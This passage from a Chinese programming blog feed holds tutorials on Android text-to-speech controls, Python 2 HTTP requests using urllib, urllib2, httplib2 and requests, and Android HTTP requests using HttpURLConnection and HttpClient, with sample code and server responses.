class="line">        </div><div class="line">    mSeekBarSpeed.setOnSeekBarChangeListener(<span class="keyword">new</span> OnSeekBarChangeListener() &#123;</div><div class="line">    </div><div class="line">        <span class="meta">@Override</span></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onStopTrackingTouch</span><span class="params">(SeekBar seekbar)</span> </span>&#123;</div><div class="line">            <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">            <span class="comment">// 设置语速</span></div><div class="line">            mTts.setParameter(SpeechConstant.SPEED, seekbar.getProgress()+ <span class="string">""</span>);</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        <span class="meta">@Override</span></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onStartTrackingTouch</span><span class="params">(SeekBar arg0)</span> </span>&#123;</div><div class="line">            <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        </div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        <span class="meta">@Override</span></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onProgressChanged</span><span class="params">(SeekBar arg0, <span class="keyword">int</span> arg1, <span class="keyword">boolean</span> arg2)</span> </span>&#123;</div><div class="line">            <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        </div><div class="line">        &#125;</div><div class="line">    &#125;);</div><div class="line"></div><div class="line">    mSeekBarVolume.setOnSeekBarChangeListener(<span class="keyword">new</span> OnSeekBarChangeListener() &#123;</div><div class="line">    </div><div class="line">        <span class="meta">@Override</span></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onStopTrackingTouch</span><span class="params">(SeekBar seekbar)</span> </span>&#123;</div><div class="line">            <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">            <span class="comment">// 设置音量，范围 0~100</span></div><div class="line">            mTts.setParameter(SpeechConstant.VOLUME,seekbar.getProgress() + <span class="string">""</span>);</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        <span class="meta">@Override</span></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onStartTrackingTouch</span><span class="params">(SeekBar arg0)</span> </span>&#123;</div><div class="line">            <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        </div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        <span class="meta">@Override</span></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onProgressChanged</span><span class="params">(SeekBar arg0, <span class="keyword">int</span> arg1,</span></span></div><div class="line">        <span class="keyword">boolean</span> arg2) &#123;</div><div class="line">            <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        </div><div class="line">        &#125;</div><div class="line">    &#125;);</div><div class="line">    </div><div class="line">    mButton.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</div><div class="line">    </div><div class="line">        <span class="meta">@Override</span></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg0)</span> </span>&#123;</div><div class="line">            <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">            String text = mEditText.getText().toString();</div><div class="line">            <span class="comment">// 开始合成</span></div><div class="line">            mTts.startSpeaking(text, mSynListener);</div><div class="line">        &#125;</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　至此，我们就可以为我们的应用添加语音合成功能啦，是不是很方便？其实，除此之外，科大讯飞的 SDK 还具备语音识别、声纹密码、人脸识别等多种功能，具体的操作方法请参考下载的 SDK 工具包中的中文文档资料。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>TTS</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Http网络请求</title>
    <url>/2016/08/07/Python-Http%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82/</url>
    <content><![CDATA[<p>　　Python 网络爬虫开发离不开 Http 网络请求，此前的几篇 Python 网络爬虫博客中，对网络爬虫已经有了一些基本的介绍，也使用了一些网络请求库，但是没有对 Python 网络请求做详细的说明，此篇博客将对 Python 的 Http 网络请求进行一个总结，通过列举不同的 Http 请求库的不同请求写法来熟悉 Python 的网络请求，从而有利于后续的网络爬虫开发。</p>
<a id="more"></a>
<p>　　<strong>注：博主的Python环境为Python2.7.5，使用Python3的读者要注意个别的类库与Python2有很大区别。</strong></p>
<h4 id="urllib与urllib2模块"><a href="#urllib与urllib2模块" class="headerlink" title="urllib与urllib2模块"></a>urllib与urllib2模块</h4><h5 id="urllib与urllib2比较"><a href="#urllib与urllib2比较" class="headerlink" title="urllib与urllib2比较"></a>urllib与urllib2比较</h5><p>　　urllib 与 urllib2 是 Python自带的库，不需要额外导入，但是很多人可能会比较困惑这两个库有什么区别呢？很多人认为 urllib2 是 urllib 的升级版，我之前也是这么认为的，但是这是不对的。</p>
<p>　　urllib 和urllib2都是接受URL请求的相关模块，但是他们是不可相互替代的，因为提供了不同的功能。整体来说，urllib2是urllib的增强，但是urllib中有urllib2中所没有的函数。他们两个最显著的不同如下：</p>
<ol>
<li><p>urllib2可以接受一个Request类的实例来设置URL请求的Headers，urllib仅可以接受URL。这意味着，你不可以伪装你的User Agent字符串等。如果你访问一个网站，想更改User Agent（可以伪装你的浏览器），你就要用urllib2。</p>
</li>
<li><p>urllib支持设置编码的函数，urllib.urlencode，在模拟登陆的时候，经常要post编码之后的参数，所以要想不使用第三方库完成模拟登录，你就需要使用urllib。也正因为如此，urllib常和urllib2一起使用。</p>
</li>
</ol>
<h5 id="urllib模块"><a href="#urllib模块" class="headerlink" title="urllib模块"></a>urllib模块</h5><ul>
<li>urlopen()函数的使用</li>
</ul>
<p><strong>urlopen(url, data=None, proxies=None)</strong></p>
<p>参数url：表示远程数据的路径，一般是http或者ftp路径。</p>
<p>可选参数data：表示以post方式提交到url的数据。</p>
<p>可选参数proxies：表示用于代理的设置。</p>
<p><strong>urlopen返回一个类文件对象，它提供了如下方法：</strong></p>
<ul>
<li><p>read() , readline() , readlines()，fileno()和close()：这些函数的使用与文件对象完全一样。</p>
</li>
<li><p>info()：返回一个httplib.HTTPMessage 对象，表示远程服务器返回的头信息。</p>
</li>
<li><p>getcode()：返回Http状态码，如果是http请求，200表示请求成功完成;404表示网址未找到。</p>
</li>
<li><p>geturl()：返回请求的url地址。</p>
</li>
</ul>
<h5 id="简单GET请求"><a href="#简单GET请求" class="headerlink" title="简单GET请求"></a>简单GET请求</h5><p>　　此处代码中的 GET 请求都是对博主博客的一个404页面发送的请求，会返回服务器响应信息以及网页源代码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"></div><div class="line">res = urllib.urlopen(<span class="string">"http://blog.line-coding.tech/"</span>)</div><div class="line"></div><div class="line"><span class="keyword">print</span> res.info()</div><div class="line"><span class="keyword">print</span> res.getcode()</div><div class="line"><span class="keyword">print</span> res.geturl()</div><div class="line"><span class="keyword">print</span> res.read()</div></pre></td></tr></table></figure>
<p>　　运行结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Date: Sat, 06 Aug 2016 13:48:53 GMT</div><div class="line">Server: Apache/2.4.6 (CentOS) mod_wsgi/4.5.3 Python/2.7.5 PHP/5.4.16</div><div class="line">Last-Modified: Thu, 14 Jul 2016 06:29:45 GMT</div><div class="line">ETag: &quot;4f3-53792a0bfd6ca&quot;</div><div class="line">Accept-Ranges: bytes</div><div class="line">Content-Length: 1267</div><div class="line">Connection: close</div><div class="line">Content-Type: text/html; charset=UTF-8</div><div class="line"></div><div class="line"></div><div class="line">200</div><div class="line">http://blog.line-coding.tech/</div><div class="line"></div><div class="line">篇幅有限，此处省略了请求页面的html文档。</div></pre></td></tr></table></figure>
<h5 id="简单POST请求"><a href="#简单POST请求" class="headerlink" title="简单POST请求"></a>简单POST请求</h5><p>此处代码的POST请求都是对博主服务器上的一个用户注册API接口发送的请求，其中请求参数包括用户名和密码，如果服务器中的数据库已经存在此账号则会返回一个exist，如果注册成功则会返回一个success，请求错误则返回一个go away。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"># -*- coding:utf-8 -*-</div><div class="line">import urllib</div><div class="line">url = &apos;http://data.line-coding.tech/register.php&apos;</div><div class="line">data = &#123;&apos;username&apos;:&apos;13654852343&apos;,&apos;password&apos;:&apos;123456&apos;&#125;</div><div class="line">res = urllib.urlopen(url, data = urllib.urlencode(data))</div><div class="line">print res.info()</div><div class="line">print res.getcode()</div><div class="line">print res.geturl()</div><div class="line">print res.read()</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">运行结果如下：</div><div class="line">篇幅有限，此处只写出服务器返回的内容</div><div class="line">exist</div></pre></td></tr></table></figure>
<h5 id="urllib2模块"><a href="#urllib2模块" class="headerlink" title="urllib2模块"></a>urllib2模块</h5><p>urllib2用一个Request对象来映射你提出的HTTP请求,在它最简单的使用形式中你将用你要请求的地址创建一个Request对象，通过调用urlopen并传入Request对象，将返回一个相关请求response对象，这个应答对象如同一个文件对象，所以你同样可以像在使用urllib模块时调用info()、getcode()、geturl()、read()等函数。</p>
<h5 id="简单GET请求-1"><a href="#简单GET请求-1" class="headerlink" title="简单GET请求"></a>简单GET请求</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"># -*- coding:utf-8 -*-</div><div class="line">import urllib2</div><div class="line"></div><div class="line">res = urllib2.urlopen(&quot;http://blog.line-coding.tech/&quot;)</div><div class="line">print res.info()</div><div class="line">print res.getcode()</div><div class="line">print res.geturl()</div><div class="line">print res.read()</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">运行结果同urllib的GET方法</div></pre></td></tr></table></figure>
<p><strong>说明：</strong></p>
<p>下文中使用到百度APIStore中一个既可以接收GET请求又可以接收POST请求的查询学校信息的API接口，该接口的使用方法可参考 相关文档（<a href="http://apistore.baidu.com/apiworks/servicedetail/2843.html" target="_blank" rel="external">http://apistore.baidu.com/apiworks/servicedetail/2843.html</a>），简单说来，使用它时需要传递一个学校名字的参数，以及添加自己的百度API Store的API-key。由于它既可以接收GET请求又可以接收POST请求，所以下文的示例代码中会得到很多同样的结果，但是采用GET方法时参数是连接在在url后面的，而POST方法则不是，请大家注意区分。</p>
<h5 id="带Header的POST请求"><a href="#带Header的POST请求" class="headerlink" title="带Header的POST请求"></a>带Header的POST请求</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"># -*- coding:utf-8 -*-</div><div class="line">import urllib,urllib2</div><div class="line">from urllib import urlencode</div><div class="line"></div><div class="line">url = &apos;http://apis.baidu.com/jidichong/school_search/school_search&apos;</div><div class="line">data = &#123;&apos;name&apos;:&apos;清华大学&apos;&#125;</div><div class="line">req = urllib2.Request(url, urlencode(data))</div><div class="line">req.add_header(&quot;apikey&quot;, &quot;c57bc70b78d5926e8cfbb3ad9c195465&quot;)    #此处添加自己的百度API Stroe的APIKEY</div><div class="line">resp = urllib2.urlopen(req)</div><div class="line">print resp.read()</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">运行结果如下：</div><div class="line">&#123;&quot;status&quot;:1,&quot;msg&quot;:&quot;请求成功&quot;,&quot;result&quot;:&#123;&quot;npage&quot;:1,&quot;pageSize&quot;:10,&quot;total&quot;:1,&quot;data&quot;:[&#123;&quot;phone&quot;:&quot;010-62770334;010-62782051&quot;,&quot;website&quot;:&quot;www.tsinghua.edu.cn&quot;,&quot;email&quot;:&quot;zsb@mail.tsinghua.edu.cn&quot;,&quot;address&quot;:&quot;北京市海淀区清华大学&quot;,&quot;zipcode&quot;:&quot;&quot;,&quot;name&quot;:&quot;清华大学&quot;,&quot;img&quot;:&quot;http://img.jidichong.com/school/3.png&quot;,&quot;parent&quot;:&quot;教育部&quot;,&quot;type&quot;:&quot; 211 985&quot;,&quot;profile&quot;:&quot;&quot;,&quot;info&quot;:&quot;院士：68人 博士点：198个 硕士点：181个&quot;,&quot;city&quot;:&quot;北京&quot;&#125;]&#125;&#125;</div></pre></td></tr></table></figure>
<h4 id="httplib2模块"><a href="#httplib2模块" class="headerlink" title="httplib2模块"></a>httplib2模块</h4><h5 id="安装httplib2模块"><a href="#安装httplib2模块" class="headerlink" title="安装httplib2模块"></a>安装httplib2模块</h5><p>httplib2是一个全面的HTTP客户端库，它也是一个第三方开源库，所以需要自行安装。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">pip install httplib2</div></pre></td></tr></table></figure>
<h5 id="带参数和Header的GET请求"><a href="#带参数和Header的GET请求" class="headerlink" title="带参数和Header的GET请求"></a>带参数和Header的GET请求</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"># -*- coding:utf-8 -*-</div><div class="line">import httplib2 </div><div class="line">h = httplib2.Http()  </div><div class="line">url = &apos;http://apis.baidu.com/jidichong/school_search/school_search/?name=清华大学&apos;   #带请求参数的url</div><div class="line">headers = &#123;&apos;apikey&apos;: &apos;c57bc70b78d5926e8cfbb3ad9c195465&apos;&#125;</div><div class="line">resp, content = h.request (url,&apos;GET&apos;, None , headers)  #使用GET方法时，这里的Body参数必须写成None</div><div class="line"># print resp</div><div class="line">print content</div></pre></td></tr></table></figure>
<p><strong>httplib2 Http对象的request()方法返回两个值：</strong></p>
<p>第一个是httplib2.Response对象，其中包含了服务器返回的所有http头。比如, status为200 表示请求成功。</p>
<p>第二个返回值包含了http服务器返回的实际数据。数据以bytes对象返回，不是字符串。 如果你需要一个字符串，你需要确定字符编码并自己进行转换</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">程序运行结果：</div><div class="line">&#123;&quot;status&quot;:1,&quot;msg&quot;:&quot;请求成功&quot;,&quot;result&quot;:&#123;&quot;npage&quot;:1,&quot;pageSize&quot;:10,&quot;total&quot;:1,&quot;data&quot;:[&#123;&quot;phone&quot;:&quot;010-62770334;010-62782051&quot;,&quot;website&quot;:&quot;www.tsinghua.edu.cn&quot;,&quot;email&quot;:&quot;zsb@mail.tsinghua.edu.cn&quot;,&quot;address&quot;:&quot;北京市海淀区清华大学&quot;,&quot;zipcode&quot;:&quot;&quot;,&quot;name&quot;:&quot;清华大学&quot;,&quot;img&quot;:&quot;http://img.jidichong.com/school/3.png&quot;,&quot;parent&quot;:&quot;教育部&quot;,&quot;type&quot;:&quot; 211 985&quot;,&quot;profile&quot;:&quot;&quot;,&quot;info&quot;:&quot;院士：68人 博士点：198个 硕士点：181个&quot;,&quot;city&quot;:&quot;北京&quot;&#125;]&#125;&#125;</div></pre></td></tr></table></figure>
<h5 id="带参数和Header的POST请求"><a href="#带参数和Header的POST请求" class="headerlink" title="带参数和Header的POST请求"></a>带参数和Header的POST请求</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"># -*- coding:utf-8 -*-</div><div class="line">import httplib2 </div><div class="line">from urllib import urlencode</div><div class="line">h = httplib2.Http() </div><div class="line">url = &apos;http://apis.baidu.com/jidichong/school_search/school_search&apos;</div><div class="line">data = &#123;&apos;name&apos;:&apos;清华大学&apos;&#125; </div><div class="line">headers = &#123;&apos;apikey&apos;: &apos;c57bc70b78d5926e8cfbb3ad9c195465&apos;,&apos;Content-type&apos;: &apos;application/x-www-form-urlencoded&apos;&#125;</div><div class="line"># 必须带上headers参数，否则POST不成功</div><div class="line">resp, content = h.request(url,&apos;POST&apos;,urlencode(data),headers) </div><div class="line"># print resp  </div><div class="line">print content</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">程序运行结果同上GET方法</div></pre></td></tr></table></figure>
<h4 id="requests模块"><a href="#requests模块" class="headerlink" title="requests模块"></a>requests模块</h4><p>requests是第三方库，它使用的是urllib3，继承了urllib2的所有特性。Requests支持HTTP连接保持和连接池，支持使用cookie保持会话，支持文件上传，支持自动确定响应内容的编码，支持国际化的URL和POST数据自动编码。同时，它支持Http协议的GET、POST、PUT、DELETE等多种请求方式。</p>
<h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">pip install requests</div></pre></td></tr></table></figure>
<h5 id="简单GET请求-2"><a href="#简单GET请求-2" class="headerlink" title="简单GET请求"></a>简单GET请求</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"># -*- coding:utf-8 -*-</div><div class="line">import requests</div><div class="line">import sys </div><div class="line">reload(sys) </div><div class="line">sys.setdefaultencoding(&apos;utf8&apos;)  #设置文件的编码方式</div><div class="line"></div><div class="line">req = requests.get(url=&apos;http://blog.line-coding.tech&apos;)    </div><div class="line">print req.url</div><div class="line">print req.status_code </div><div class="line">print req.text</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">程序运行结果：</div><div class="line">http://blog.line-coding.tech/</div><div class="line">200</div><div class="line">篇幅有限，此处省去网页源代码</div></pre></td></tr></table></figure>
<h5 id="带参数和Header的GET请求-1"><a href="#带参数和Header的GET请求-1" class="headerlink" title="带参数和Header的GET请求"></a>带参数和Header的GET请求</h5><p>如果你想为请求添加HTTP头部，只要简单地传递一个dict给headers参数就可以了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"># -*- coding:utf-8 -*-</div><div class="line">import requests</div><div class="line">import sys </div><div class="line">reload(sys) </div><div class="line">sys.setdefaultencoding(&apos;utf8&apos;)  #设置文件的编码方式</div><div class="line"></div><div class="line">url = &apos;http://apis.baidu.com/jidichong/school_search/school_search&apos;</div><div class="line">headers = &#123;&apos;apikey&apos;:&apos;c57bc70b78d5926e8cfbb3ad9c195465&apos;&#125;</div><div class="line">params = &#123;&apos;name&apos;:&apos;清华大学&apos;&#125;</div><div class="line">rep = requests.get(url, params = params, headers = headers)</div><div class="line">print rep.text</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">程序运行结果：</div><div class="line">&#123;&quot;status&quot;:1,&quot;msg&quot;:&quot;请求成功&quot;,&quot;result&quot;:&#123;&quot;npage&quot;:1,&quot;pageSize&quot;:10,&quot;total&quot;:1,&quot;data&quot;:[&#123;&quot;phone&quot;:&quot;010-62770334;010-62782051&quot;,&quot;website&quot;:&quot;www.tsinghua.edu.cn&quot;,&quot;email&quot;:&quot;zsb@mail.tsinghua.edu.cn&quot;,&quot;address&quot;:&quot;北京市海淀区清华大学&quot;,&quot;zipcode&quot;:&quot;&quot;,&quot;name&quot;:&quot;清华大学&quot;,&quot;img&quot;:&quot;http://img.jidichong.com/school/3.png&quot;,&quot;parent&quot;:&quot;教育部&quot;,&quot;type&quot;:&quot; 211 985&quot;,&quot;profile&quot;:&quot;&quot;,&quot;info&quot;:&quot;院士：68人 博士点：198个 硕士点：181个&quot;,&quot;city&quot;:&quot;北京&quot;&#125;]&#125;&#125;</div></pre></td></tr></table></figure>
<h5 id="带参数和Header的POST请求-1"><a href="#带参数和Header的POST请求-1" class="headerlink" title="带参数和Header的POST请求"></a>带参数和Header的POST请求</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"># -*- coding:utf-8 -*-</div><div class="line">import requests</div><div class="line">import sys </div><div class="line">reload(sys) </div><div class="line">sys.setdefaultencoding(&apos;utf8&apos;)  #设置文件的编码方式</div><div class="line"></div><div class="line">url = &apos;http://apis.baidu.com/jidichong/school_search/school_search&apos;</div><div class="line">headers = &#123;&apos;apikey&apos;:&apos;c57bc70b78d5926e8cfbb3ad9c195465&apos;&#125;</div><div class="line">data = &#123;&apos;name&apos;: &apos;清华大学&apos;&#125;</div><div class="line">r = requests.post(url , data = data, headers = headers )</div><div class="line">print r.text</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">程序运行结果同上带参数和Header的GET请求，注意这是因为这个接口能够接收GET和POST两种方式的请求，如果你使用的接口有规定只使用GET方法，</div><div class="line">那还是按规定来吧，要不然请求肯定失败。</div></pre></td></tr></table></figure>
<h5 id="POST发送JSON数据"><a href="#POST发送JSON数据" class="headerlink" title="POST发送JSON数据"></a>POST发送JSON数据</h5><p>由于没有找到合适的可以接收JSON数据的API来做这个测试，所以这里摘抄了别人的一段代码，貌似这个接口也不能用了，悲剧啊。不过，反正就是使用json.dumps将dict转换成json格式的数据之后添加到post的参数中然后再发送post请求就对了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"># -*- coding:utf-8 -*-</div><div class="line">import requests</div><div class="line">import json</div><div class="line"></div><div class="line">url = &apos;https://api.github.com/some/endpoint&apos;</div><div class="line">payload = &#123;&apos;some&apos;: &apos;data&apos;&#125;</div><div class="line">r = requests.post(url, data = json.dumps(payload))</div><div class="line">print r.text</div></pre></td></tr></table></figure>
<p>貌似这个接口也不能用了，待博主找到一个更好的API接口再来更新吧，先写到这里了。说实话，总结了四个网络请求模块，把我自己都搞晕了，但是最后也还是弄清楚了，可能放在一起来看有点容易搞混，但是有对比才有知道自己应该用哪个啊。</p>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Http</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Http 网络请求</title>
    <url>/2016/08/05/Android%20Http%20%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82/</url>
    <content><![CDATA[<p>　　Android 网络编程（特别是 Http 请求）是 Android 学习中比较重要的内容，也是 Android 开发中比较常用的内。虽然已经有很多优秀的第三方开源框架供我们使用，也大大提升了我们的开发效率，但是也因此我们对基本 Http 请求的并不熟悉，我们应该重视基础，从底层去了解网络请求的实现机制。此篇博客总结了 Android 两种基本的网络请求方式，并通过一个简单的 Demo 进行实践。</p>
<a id="more"></a>
<h4 id="Android-网络编程注意事项"><a href="#Android-网络编程注意事项" class="headerlink" title="Android 网络编程注意事项"></a>Android 网络编程注意事项</h4><ul>
<li>安卓的耗时操作（如 I/O 流操作）的逻辑不能写在主线程，必须写在子线程。</li>
<li>子线程在安卓 2.3 以后不能更新 UI 界面（更新就报错），子线程想要更新界面必须结合 Handler 或者 AsyncTask 等才可以。</li>
<li>Android 网络操作均需添加网络访问权限：</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span>/&gt;</span></div></pre></td></tr></table></figure>
<h4 id="说明事项"><a href="#说明事项" class="headerlink" title="说明事项"></a>说明事项</h4><p>　　以下代码中的 GET 请求都是对博主博客的一个 404 页面发送的请求，会返回该页面的 html 代码，POST 请求都是对博主服务器上的一个用户注册 API 接口发送的请求，其中请求参数包括用户名和密码，如果服务器中的数据库已经存在此账号则会返回一个 exist，如果注册成功则会返回一个 success，否则返回一个 error。</p>
<h4 id="HttpURLConnection"><a href="#HttpURLConnection" class="headerlink" title="HttpURLConnection"></a>HttpURLConnection</h4><p>　　HttpURLConnection 类位于 java.net 包中，用于发送 HTTP 请求和获取 HTTP 响应。该类是抽象类，不能直接实例化，要使用URL的 openConnection() 方法获得。</p>
<h5 id="发送-GET-请求"><a href="#发送-GET-请求" class="headerlink" title="发送 GET 请求"></a>发送 GET 请求</h5><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">get</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://blog.line-coding.tech/"</span>);</div><div class="line">        HttpURLConnection huc = (HttpURLConnection) url.openConnection();</div><div class="line">        <span class="comment">// mUrlConnection.setRequestMethod("GET"); //默认就是GET方式，此声明可不要</span></div><div class="line">        <span class="comment">//获取字节流，并将字节流转换成字符流</span></div><div class="line">        InputStreamReader isr = <span class="keyword">new</span> InputStreamReader(huc.getInputStream());         <span class="comment">//缓冲字符流，以便读取</span></div><div class="line">        BufferedReader br = <span class="keyword">new</span> BufferedReader(isr);    </div><div class="line">        String inputLine = <span class="keyword">null</span>;</div><div class="line">        <span class="comment">//按行读取数据</span></div><div class="line">        <span class="keyword">while</span> ((inputLine = br.readLine()) != <span class="keyword">null</span>) &#123;</div><div class="line">            result += inputLine + <span class="string">"\n"</span>;</div><div class="line">        &#125;</div><div class="line">        isr.close();    <span class="comment">//关闭输入流</span></div><div class="line">        huc.disconnect();   <span class="comment">//关闭连接</span></div><div class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line">        <span class="comment">// TODO Auto-generated catch block</span></div><div class="line">        e.printStackTrace();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　GET 方法在传递中文参数时，会产生乱码，要进行 Base64 编码来解决乱码问题。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> String <span class="title">base64Encode</span><span class="params">(String params)</span> </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        params = Base64.encodeToString(params.getBytes(<span class="string">"utf-8"</span>), Base64.DEFAULT);</div><div class="line">        params = URLEncoder.encode(params,<span class="string">"utf-8"</span>);</div><div class="line">    &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</div><div class="line">        <span class="comment">// TODO Auto-generated catch block</span></div><div class="line">        e.printStackTrace();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> params;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="发送-POST-请求"><a href="#发送-POST-请求" class="headerlink" title="发送 POST 请求"></a>发送 POST 请求</h5><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">post</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://data.line-coding.tech/register.php"</span>);</div><div class="line">        HttpURLConnection huc = (HttpURLConnection) url.openConnection();</div><div class="line">        huc.setRequestMethod(<span class="string">"POST"</span>);</div><div class="line">        huc.setDoInput(<span class="keyword">true</span>); <span class="comment">// 向连接中写入数据</span></div><div class="line">        huc.setDoOutput(<span class="keyword">true</span>); <span class="comment">// 向连接中读取数据</span></div><div class="line">        huc.setUseCaches(<span class="keyword">false</span>); <span class="comment">// 禁止缓存</span></div><div class="line">        huc.setInstanceFollowRedirects(<span class="keyword">true</span>); <span class="comment">// 自动执行Http重定向</span></div><div class="line">        huc.setRequestProperty(<span class="string">"Content-Type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);  <span class="comment">//设置内容类型</span></div><div class="line">        DataOutputStream dos = <span class="keyword">new</span> DataOutputStream(huc.getOutputStream()); <span class="comment">//获取输出流</span></div><div class="line">        String params = <span class="string">"username=13674852343"</span> + <span class="string">"&amp;password=123456"</span>;    <span class="comment">//添加请求参数</span></div><div class="line">        dos.writeBytes(params);     <span class="comment">//将数据写入到输出流</span></div><div class="line">        dos.flush();    <span class="comment">//输出缓存</span></div><div class="line">        dos.close();    <span class="comment">//关闭输出流</span></div><div class="line">        <span class="keyword">if</span> (huc.getResponseCode() == HttpURLConnection.HTTP_OK) &#123;</div><div class="line">            InputStreamReader isr = <span class="keyword">new</span> InputStreamReader(</div><div class="line">            huc.getInputStream());</div><div class="line">            BufferedReader br = <span class="keyword">new</span> BufferedReader(isr);</div><div class="line">            String inputLine = <span class="keyword">null</span>;</div><div class="line">            <span class="keyword">while</span> ((inputLine = br.readLine()) != <span class="keyword">null</span>) &#123;</div><div class="line">                result += inputLine + <span class="string">"\n"</span>;</div><div class="line">            &#125;</div><div class="line">            isr.close();</div><div class="line">        &#125;</div><div class="line">        huc.disconnect();   <span class="comment">//关闭连接</span></div><div class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line">        <span class="comment">// TODO Auto-generated catch block</span></div><div class="line">        e.printStackTrace();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="HttpClient"><a href="#HttpClient" class="headerlink" title="HttpClient"></a>HttpClient</h4><p>　　对于比较复杂的联网操作，使用 HttpUrlConnection 就不一定能够满足要求，此时，可以使用 Apache 组织提供的 HttpClient 项目来实现。HttpClient 中将 HttpUrlConnection 类中的输入/输出流操作统一封装成 HttpGet、HttpPost 和 HttpResponse 类。其中 HttpGet 类代表发送 GET 请求、HttpPost 代表发送 POST 请求、HttpResponse 类代表处理响应的对象。</p>
<h5 id="发送-GET-请求-1"><a href="#发送-GET-请求-1" class="headerlink" title="发送 GET 请求"></a>发送 GET 请求</h5><ul>
<li>使用流程</li>
</ul>
<ol>
<li><p>创建 HttpClient 对象</p>
</li>
<li><p>创建 HttpGet 对象</p>
</li>
<li><p>如需添加参数，可以在 url 中添加参数，也可调用 HttpGet 的 setParams() 方法来添加请求参数。</p>
</li>
<li><p>调用 HttpClient 对象的 execute() 方法发送请求。</p>
</li>
<li><p>调用 HttpResponse 的 getEntity() 方法获得包含服务器响应内容的 HttpEntity 对象。</p>
</li>
</ol>
<ul>
<li>使用示例</li>
</ul>
